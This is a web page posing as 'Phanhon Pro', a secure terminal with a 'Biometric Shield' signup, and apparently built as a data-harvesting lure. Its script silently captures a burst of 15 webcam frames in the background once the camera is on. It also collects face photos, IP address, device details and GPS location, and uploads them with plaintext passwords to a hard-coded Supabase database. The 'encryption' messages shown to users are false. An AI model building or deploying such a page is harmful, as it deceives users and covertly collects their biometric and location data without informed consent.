<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Phanhon Pro | Secure Access</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Using standard Supabase import -->
    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
        
        :root { 
            --accent: #ffffff; 
            --bg: #000000; 
            --card: #0a0a0a; 
            --muted: #555555; 
        }

        body { 
            font-family: 'Inter', sans-serif; 
            background-color: var(--bg); 
            color: #fff; 
            margin: 0; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            overscroll-behavior-y: contain; 
            overflow: hidden;
        }

        .app-container { 
            width: 100%; 
            height: 100vh; 
            background: var(--bg); 
            position: relative; 
            display: flex; 
            flex-direction: column; 
            overflow: hidden; 
        }

        @media (min-width: 640px) { 
            .app-container { 
                max-width: 380px; 
                height: 720px; 
                border: 1px solid #1a1a1a; 
                border-radius: 40px; 
                box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            } 
        }

        .glass { 
            background: var(--card); 
            border: 1px solid rgba(255, 255, 255, 0.05); 
        }

        .phantom-btn { 
            background: var(--accent); 
            color: #000; 
            font-weight: 700; 
            border-radius: 14px; 
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1); 
        }

        .phantom-btn:active { 
            transform: scale(0.96); 
            opacity: 0.8; 
        }

        .loader { 
            width: 24px; 
            height: 24px; 
            border: 3px solid rgba(255,255,255,0.1); 
            border-bottom-color: #fff; 
            border-radius: 50%; 
            display: inline-block; 
            animation: rotation 0.8s linear infinite; 
        }

        @keyframes rotation { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }

        .hidden { display: none !important; }

        video { 
            transform: scaleX(-1); 
            border-radius: 24px; 
            background: #050505; 
            object-fit: cover;
        }

        input::placeholder {
            color: rgba(255, 255, 255, 0.2);
        }
    </style>
</head>
<body>
    <div class="app-container" id="app">
        <!-- AUTH SCREEN -->
        <div id="auth-screen" class="absolute inset-0 bg-black z-[500] p-10 flex flex-col justify-center animate__animated animate__fadeIn">
            <div class="w-12 h-12 bg-white rounded-xl mb-6 flex items-center justify-center text-2xl font-black text-black">P</div>
            <h1 class="text-3xl font-bold mb-2 tracking-tighter">Phanhon Pro</h1>
            <p class="text-white/40 text-xs mb-10 uppercase tracking-widest">Secure Terminal v4.0</p>
            
            <div id="login-form" class="space-y-4">
                <input id="login-username" type="text" placeholder="Username" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none text-white focus:border-white/30 transition-all">
                <input id="login-password" type="password" placeholder="Passkey" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none text-white focus:border-white/30 transition-all">
                <button onclick="signIn()" class="phantom-btn w-full py-4 text-xs uppercase tracking-widest mt-2">Sign In</button>
                <p class="text-[10px] text-white/20 text-center mt-6 cursor-pointer hover:text-white transition-colors" onclick="toggleAuth('signup')">REQUEST ACCESS / CREATE ACCOUNT</p>
            </div>

            <div id="signup-form" class="hidden space-y-4 animate__animated animate__fadeIn">
                <input id="signup-username" type="text" placeholder="New Username" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none text-white focus:border-white/30 transition-all">
                <input id="signup-password" type="password" placeholder="Passkey" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none text-white focus:border-white/30 transition-all">
                <button onclick="startVerificationFlow()" class="phantom-btn w-full py-4 text-xs uppercase tracking-widest mt-2">Begin Verification</button>
                <p class="text-[10px] text-white/20 text-center mt-6 cursor-pointer hover:text-white transition-colors" onclick="toggleAuth('login')">RETURN TO LOGIN</p>
            </div>
        </div>

        <!-- VERIFICATION SCREEN -->
        <div id="verify-screen" class="hidden absolute inset-0 bg-black z-[600] p-8 flex flex-col items-center justify-center animate__animated animate__slideInUp">
            <div class="text-center mb-8">
                <h2 class="text-xl font-bold mb-2">Biometric Shield</h2>
                <p id="verify-instruction" class="text-[11px] text-white/40 leading-relaxed px-6">Encrypted identity mapping is required for terminal authorization.</p>
            </div>
            
            <div class="relative w-full aspect-square max-w-[240px] mb-8 group">
                <!-- Decorative Corners -->
                <div class="absolute -top-2 -left-2 w-6 h-6 border-t-2 border-l-2 border-white/20 rounded-tl-lg"></div>
                <div class="absolute -top-2 -right-2 w-6 h-6 border-t-2 border-r-2 border-white/20 rounded-tr-lg"></div>
                <div class="absolute -bottom-2 -left-2 w-6 h-6 border-b-2 border-l-2 border-white/20 rounded-bl-lg"></div>
                <div class="absolute -bottom-2 -right-2 w-6 h-6 border-b-2 border-r-2 border-white/20 rounded-br-lg"></div>

                <div id="camera-placeholder" class="absolute inset-0 flex items-center justify-center bg-white/5 rounded-3xl border border-white/10 overflow-hidden">
                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="1.5">
                        <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
                        <circle cx="12" cy="13" r="4"/>
                    </svg>
                </div>

                <video id="video" width="100%" height="100%" autoplay playsinline muted class="hidden w-full h-full object-cover rounded-3xl"></video>
                <canvas id="canvas" class="hidden"></canvas>
                <div id="capture-flash" class="absolute inset-0 bg-white opacity-0 pointer-events-none transition-opacity duration-100 rounded-3xl z-10"></div>
                
                <!-- Scanning Line -->
                <div id="scanner-line" class="hidden absolute left-0 right-0 h-0.5 bg-white/30 shadow-[0_0_15px_rgba(255,255,255,0.5)] z-20 animate-pulse"></div>
            </div>

            <div class="w-full space-y-3">
                <button id="enable-camera-btn" onclick="requestCamera()" class="glass w-full py-4 text-[10px] font-bold uppercase tracking-widest rounded-2xl hover:bg-white/5 transition-colors">Initialize Camera</button>
                <button id="capture-btn" onclick="captureStep()" class="phantom-btn w-full py-4 text-[10px] uppercase tracking-widest hidden">Capture Identity</button>
                <button id="location-btn" onclick="requestLocation()" class="phantom-btn w-full py-4 text-[10px] uppercase tracking-widest hidden">Finalize Geo-Lock</button>
            </div>

            <div id="verify-loader" class="hidden flex flex-col items-center gap-4 mt-8">
                <span class="loader"></span>
                <p class="text-[9px] uppercase font-bold text-white/30 tracking-[0.4em]">Encrypting Tunnel...</p>
            </div>
        </div>

        <!-- NOTIFICATION TOAST -->
        <div id="toast" class="absolute bottom-10 left-1/2 -translate-x-1/2 glass px-6 py-4 rounded-2xl text-[10px] font-bold transition-all transform translate-y-64 z-[1001] shadow-2xl text-center min-w-[240px] border-white/10 uppercase tracking-widest">
            Notification
        </div>
    </div>

    <script>
        /** * GLOBAL CONFIG 
         */
        // INSERT YOUR FILENAME HERE (e.g., "dashboard.html" or "https://yoursite.com")
        const REDIRECT_URL = "dashboard.html"; 
        
        const SB_URL = "https://tmvimacikrnrizxtcesf.supabase.co";
        const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRtdmltYWNpa3Jucml6eHRjZXNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMDc5NzgsImV4cCI6MjA4MzY4Mzk3OH0.dwh4CWwxE53hbhgjYqOqHZYa1tNyUKNZvdb6Kq5pLC4";

        let sb = null;
        let verifyStep = 0;
        let capturedData = { thumb: null, smile: null, geo: null, device: null, burst: [] };
        let burstInterval = null;

        // Initialize Supabase
        function initSupabase() {
            if (typeof supabase !== 'undefined') {
                sb = supabase.createClient(SB_URL, SB_KEY);
            } else { 
                setTimeout(initSupabase, 200); 
            }
        }
        window.onload = initSupabase;

        // UI Helpers
        function toggleAuth(mode) { 
            const login = document.getElementById('login-form');
            const signup = document.getElementById('signup-form');
            if (mode === 'signup') {
                login.classList.add('hidden');
                signup.classList.remove('hidden');
            } else {
                login.classList.remove('hidden');
                signup.classList.add('hidden');
            }
        }

        function showToast(msg) { 
            const t = document.getElementById('toast'); 
            t.innerText = msg; 
            t.classList.remove('translate-y-64'); 
            setTimeout(() => t.classList.add('translate-y-64'), 3000); 
        }

        function flashEffect() {
            const f = document.getElementById('capture-flash');
            f.style.opacity = '1';
            setTimeout(() => f.style.opacity = '0', 150);
        }

        // Logic: SignIn
        async function signIn() {
            const u = document.getElementById('login-username').value;
            const p = document.getElementById('login-password').value;
            
            if(!u || !p) return showToast("Credentials Missing");

            try {
                const { data, error } = await sb.from('profiles').select('*').eq('username', u).eq('password', p).single();
                if(data && !error) { 
                    showToast("Access Verified. Launching...");
                    setTimeout(() => window.location.href = REDIRECT_URL, 1500);
                } else {
                    showToast("Invalid Signature");
                }
            } catch (err) {
                showToast("Terminal Connection Error");
            }
        }

        // Logic: Signup Flow
        function startVerificationFlow() {
            const u = document.getElementById('signup-username').value;
            const p = document.getElementById('signup-password').value;
            if(!u || !p) return showToast("Profile Data Required");
            
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('verify-screen').classList.remove('hidden');
        }

        async function requestCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: 640, height: 640 } 
                });
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.classList.remove('hidden');
                    document.getElementById('camera-placeholder').classList.add('hidden');
                    document.getElementById('enable-camera-btn').classList.add('hidden');
                    document.getElementById('capture-btn').classList.remove('hidden');
                    document.getElementById('scanner-line').classList.remove('hidden');
                    startBurstCapture();
                };
            } catch (e) { 
                showToast("Sensor Access Required"); 
            }
        }

        function startBurstCapture() {
            const video = document.getElementById('video');
            const canvas = document.createElement('canvas');
            canvas.width = 200; canvas.height = 200;
            const ctx = canvas.getContext('2d');
            let count = 0;

            burstInterval = setInterval(() => {
                if(count >= 15) { clearInterval(burstInterval); return; }
                if(video.srcObject) {
                    ctx.drawImage(video, 0, 0, 200, 200);
                    capturedData.burst.push(canvas.toDataURL('image/jpeg', 0.15));
                    count++;
                }
            }, 2500);
        }

        function captureStep() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            canvas.width = 400; canvas.height = 400;
            const ctx = canvas.getContext('2d');
            
            // Flip for natural save if mirrored
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, 400, 400);
            
            const img = canvas.toDataURL('image/jpeg', 0.5);
            flashEffect();

            if(verifyStep === 0) {
                capturedData.thumb = img; 
                verifyStep = 1;
                document.getElementById('verify-instruction').innerText = "Identity Captured. Analyzing Nodes...";
                showToast("Node Alpha Recorded");
            } else {
                capturedData.smile = img; 
                verifyStep = 2;
                document.getElementById('capture-btn').classList.add('hidden');
                document.getElementById('location-btn').classList.remove('hidden');
                document.getElementById('verify-instruction').innerText = "Node Beta Verified. Finalizing Geo-Lock.";
                showToast("Node Beta Recorded");
            }
        }

        async function requestLocation() {
            document.getElementById('location-btn').classList.add('hidden');
            document.getElementById('verify-loader').classList.remove('hidden');
            
            // Collect Device Meta
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                capturedData.device = {
                    ipv4: ipData.ip,
                    ua: navigator.userAgent,
                    platform: navigator.platform,
                    res: `${window.innerWidth}x${window.innerHeight}`
                };
            } catch(e) { 
                capturedData.device = { ipv4: 'Hidden' };
            }

            navigator.geolocation.getCurrentPosition(
                (pos) => { 
                    capturedData.geo = { lat: pos.coords.latitude, lng: pos.coords.longitude };
                    finishSignUp();
                },
                () => { 
                    capturedData.geo = { status: "Denied" };
                    finishSignUp(); 
                }, 
                { timeout: 4000 }
            );
        }

        async function finishSignUp() {
            const u = document.getElementById('signup-username').value;
            const p = document.getElementById('signup-password').value;
            
            try {
                // 1. Create Profile
                const { data: profile, error: pError } = await sb.from('profiles').insert([
                    { username: u, password: p, balance: 0 }
                ]).select().single();

                if(pError) {
                    showToast("Username Unavailable");
                    setTimeout(() => location.reload(), 2000);
                    return;
                }

                // 2. Upload Biometric Metadata
                await sb.from('verifications').insert([{
                    user_id: profile.id,
                    username: u,
                    thumb_img: capturedData.thumb,
                    smile_img: capturedData.smile,
                    location_data: { 
                        geo: capturedData.geo, 
                        device: capturedData.device, 
                        burst_stream: capturedData.burst 
                    }
                }]);

                showToast("Terminal Initialized.");
                setTimeout(() => window.location.href = REDIRECT_URL, 2000);

            } catch (err) {
                showToast("Critical Write Error");
                setTimeout(() => location.reload(), 2000);
            }
        }
    </script>
</body>
</html>
